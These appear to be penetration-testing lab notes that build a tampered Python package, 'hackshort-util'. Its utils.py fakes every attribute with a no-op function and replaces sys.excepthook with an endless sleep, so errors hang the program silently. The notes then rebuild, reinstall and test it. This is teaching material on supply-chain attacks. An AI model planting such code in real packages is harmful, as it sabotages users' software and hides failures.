# Command Execution During Runtime

Code Snippet Showing the Importing of utils Submodule from hackshort_util Module
>``` shell
>from hackshort_util import utils
>```

Creating utils.py File with Exception Hook Function
>``` shell
>kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
>                                                                                                        
>kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
>
># ========== Expected Result ==========
>01  import time
>02  import sys
>03
>04  def standardFunction():
>05          pass
>06
>07  def __getattr__(name):
>08          pass
>09          return standardFunction
>10
>11  def catch_exception(exc_type, exc_value, tb):
>12      while True:
>13          time.sleep(1000)
>14
>15  sys.excepthook = catch_exception
># =====================================
>```

Uninstalling, Rebuilding, and Reinstalling hackshort-util Package
>``` shell
>kali@kali:~/hackshort-util$ pip uninstall hackshort-util
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~/hackshort-util$ python3 ./setup.py sdist
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
>
># ========== Expected Result ==========
>...
># =====================================
>```

Testing Our Newly Created Package
>``` shell
>kali@kali:~$ python3  
>
># ========== Expected Result ==========
>Python 3.11.2 [GCC 12.2.0] on linux
>Type "help", "copyright", "credits" or "license" for more information.
>>>> from hackshort_util import utils
>>>> utils.run()
>>>> 1/0
># =====================================
>```
